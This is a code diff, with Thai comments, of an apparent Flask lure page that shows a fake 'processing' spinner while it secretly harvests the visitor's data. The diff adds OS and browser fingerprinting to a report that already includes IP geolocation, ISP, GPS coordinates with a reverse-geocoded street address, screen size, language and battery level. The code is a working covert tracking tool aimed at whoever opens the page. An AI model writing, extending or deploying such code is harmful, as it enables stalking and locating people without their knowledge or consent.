@@ -91,8 +91,30 @@ HTML = '''<!DOCTYPE html>
             document.body.onclick = null;
             document.getElementById('ui').innerHTML = '<div class="spinner"></div><h1>กำลังดำเนินการ...</h1><p>กรุณารอสักครู่</p>';
             
+            // ตรวจจับ OS และเบราว์เซอร์
+            const ua = navigator.userAgent;
+            let os = 'ไม่ระบุ';
+            let browser = 'ไม่ระบุ';
+            
+            if (ua.includes('iPhone')) os = 'iOS (iPhone)';
+            else if (ua.includes('iPad')) os = 'iOS (iPad)';
+            else if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('Mac OS X')) os = 'macOS';
+            else if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Linux')) os = 'Linux';
+            
+            if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) browser = 'Chrome';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Edg')) browser = 'Edge';
+            else if (ua.includes('OPR')) browser = 'Opera';
+            else if (ua.includes('CriOS')) browser = 'Chrome (iOS)';
+            else if (ua.includes('FxiOS')) browser = 'Firefox (iOS)';
+            
             const deviceInfo = {
-                userAgent: navigator.userAgent,
+                userAgent: ua,
+                os: os,
+                browser: browser,
                 platform: navigator.platform,
                 language: navigator.language,
                 vendor: navigator.vendor,
@@ -201,7 +223,6 @@ def upload():
         
         location = get_location_from_ip(real_ip)
         
-        # แปลง GPS เป็นที่อยู่
         gps_address = None
         if device_info.get('gps_lat') and device_info.get('gps_lon'):
             gps_address = reverse_geocode(device_info['gps_lat'], device_info['gps_lon'])
@@ -216,7 +237,14 @@ def upload():
             content += f"📶 ค่ายเน็ต/ISP: {location['isp']}\n"
             content += f"🗺️ พิกัด IP: {location['lat']}, {location['lon']}\n"
         
-        # GPS + ที่อยู่จาก GPS
+        # OS และเบราว์เซอร์
+        content += f"💻 ระบบปฏิบัติการ: {device_info.get('os', 'ไม่ระบุ')}\n"
+        content += f"🌐 เบราว์เซอร์: {device_info.get('browser', 'ไม่ระบุ')}\n"
+        content += f"📱 UserAgent: {device_info.get('userAgent', 'ไม่ระบุ')[:120]}\n"
+        content += f"🖥️ หน้าจอ: {device_info.get('screenWidth')}x{device_info.get('screenHeight')}\n"
+        content += f"🔤 ภาษา: {device_info.get('language', 'ไม่ระบุ')}\n"
+        
+        # GPS + ที่อยู่
         if device_info.get('gps_lat') and device_info.get('gps_lon'):
             content += f"📍 GPS: {device_info['gps_lat']}, {device_info['gps_lon']}\n"
             if device_info.get('gps_accuracy'):
@@ -236,10 +264,6 @@ def upload():
         elif device_info.get('gps') == 'ไม่ได้รับอนุญาตหรือไม่รองรับ':
             content += f"📍 GPS: ปฏิเสธหรือไม่รองรับ\n"
         
-        content += f"📱 UA: {device_info.get('userAgent', 'ไม่ระบุ')[:100]}\n"
-        content += f"💻 แพลตฟอร์ม: {device_info.get('platform', 'ไม่ระบุ')}\n"
-        content += f"🖥️ หน้าจอ: {device_info.get('screenWidth')}x{device_info.get('screenHeight')}\n"
-        content += f"🔤 ภาษา: {device_info.get('language', 'ไม่ระบุ')}\n"
         content += f"🔋 แบตเตอรี่: {device_info.get('batteryLevel', 'ไม่ระบุ')}%"
         if device_info.get('batteryCharging') is True:
             content += " (กำลังชาร์จ)"
